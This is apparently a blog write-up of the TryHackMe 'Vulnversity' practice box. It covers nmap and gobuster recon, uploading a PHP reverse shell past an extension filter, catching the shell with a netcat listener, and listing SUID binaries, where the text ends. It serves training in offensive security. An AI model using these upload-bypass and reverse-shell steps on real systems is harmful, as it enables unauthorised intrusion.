---
title: "Try Hach Me - Vulnversity"
date: 2022-05-08T17:50:58+05:30
description: "vulnversiy  was the first box towards offensive security path. we found web portal running on port 3333 using gobuster we found some  directory's,  which helps To upload our shell codes. with help of  securifera github page we can able to identify correct file  extension, gained user shell using php-reverse-shell and escalated privilege using SUID bit binary with help of Gtfobins."
draft: false
hideToc: false
tocPosition: outer
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags: 
- suid
- systemctl
series:
- Try Hack Me - Offensive Security
categories:
- tryhackme
image: /images/tryhackme/vulnversity/cover.webp
---
## Road Map
{{< img src="/images/tryhackme/vulnversity/roadmap.webp" alt="image alt" width="1000px" position="center" >}}
#
Vulnversiy  is the first box towards offensive security path. we found web portal running on port 3333 using gobuster we found some  directory's,  which helps To upload our shell codes. with help of securifera github page we can able to identify correct file  extension, gained user shell using weevely and escalated privilege using SUID bit binary with help of Gtfobins.
## Info Table
<table style="width:70%">
 <thead>
  <tr>
    <th>Title</th>
    <th>Vulnversity</th>
  </tr>
</thead>
  <tr>
    <td>Description</td>
    <td>Learn about active recon, web app attacks and privilege escalation.</td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td>Try Hack Me </td>
    </tr>
</table>

## Reconnaissance
``` bash
$ nmap -sV 10.10.8.53
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-28 15:35 IST
Nmap scan report for 10.10.8.53
Host is up (0.30s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.94 seconds

```
The result of nmap scan makes port 3333 interest because.  service HTTP belongs to port 80. lets dig port 3333

{{< img src="/images/tryhackme/vulnversity/1.png" alt="image alt" width="1000px" position="center" >}}

## directory search

lets do directory search and identify if any sensitive directory  are exposed 

``` bash {hl_lines=[23]}
$gobuster dir -u http://10.10.1.215:3333 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.1.215:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/28 23:29:54 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/css                  (Status: 301) [Size: 315] [--> http://10.10.1.215:3333/css/]
/fonts                (Status: 301) [Size: 317] [--> http://10.10.1.215:3333/fonts/]
/images               (Status: 301) [Size: 318] [--> http://10.10.1.215:3333/images/]
/index.html           (Status: 200) [Size: 33014]                                    
/internal             (Status: 301) [Size: 320] [--> http://10.10.1.215:3333/internal/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.1.215:3333/js/]      
/server-status        (Status: 403) [Size: 301]                                        
                                                                                       
===============================================================
2022/04/28 23:31:55 Finished
===============================================================
```
{{< img src="/images/tryhackme/vulnversity/2.png" alt="image alt" width="1000px" position="center" >}}

here there is a place to upload file, lets try to upload reverse shell file, in kali below directory we have set of php shell payloads. just modify attacker ip and port and upload

## Reverse shell
``` bash
$vim /usr/share/webshells/php/php-reverse-shell.php
```
{{< img src="/images/tryhackme/vulnversity/3.png" alt="image alt" width="800px" position="center" >}}

upload the php reverse shell 

{{< img src="/images/tryhackme/vulnversity/4.png" alt="image alt" width="1000px" position="center" >}}

we notice that .php extension is not allowed to upload, lets try to bypass or find right extension to upload 

{{< img src="/images/tryhackme/vulnversity/5.png" alt="image alt" width="1000px" position="center" >}}

we need list of extension file we will use   <a href="https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4">securifera</a> filename extension file which is available on his github page 

{{< img src="/images/tryhackme/vulnversity/6.png" alt=" image alt" width="1000px" position="center">}}

make sure that you need to untuck url encoding which is available under Payload Encoding 

{{< img src="/images/tryhackme/vulnversity/7.png" alt=" image alt" width="1000px" position="center">}}

after our payload has been uploaded successfully, we need to find right directory ware our payload has been uploaded, again we will use directory search each suspicious directory 

{{< img src="/images/tryhackme/vulnversity/8.png" alt=" image alt" width="800px" position="center">}}

we finded upload directory and it contains our payload, before accessing payload file, netcat listen on port which is configured on payload 

## Initial FootHold
``` bash
┌─[atomloop@atomloop-virtualbox]─[~]
└──_ $sudo nc -lvnp 8181
[sudo] password for atomloop: 
listening on [any] 8181 ...
connect to [10.18.105.26] from (UNKNOWN) [10.10.25.213] 37564
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 05:48:30 up  1:40,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```
yes, we got our initial foot hold, lets try to esculate privilege, lets list any SUID files 

### SUID files 

``` bash  {hl_lines=[26]}
$ sudo -l
sudo: no tty present and no askpass program specified
$ find / -perm -u=s 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs

```


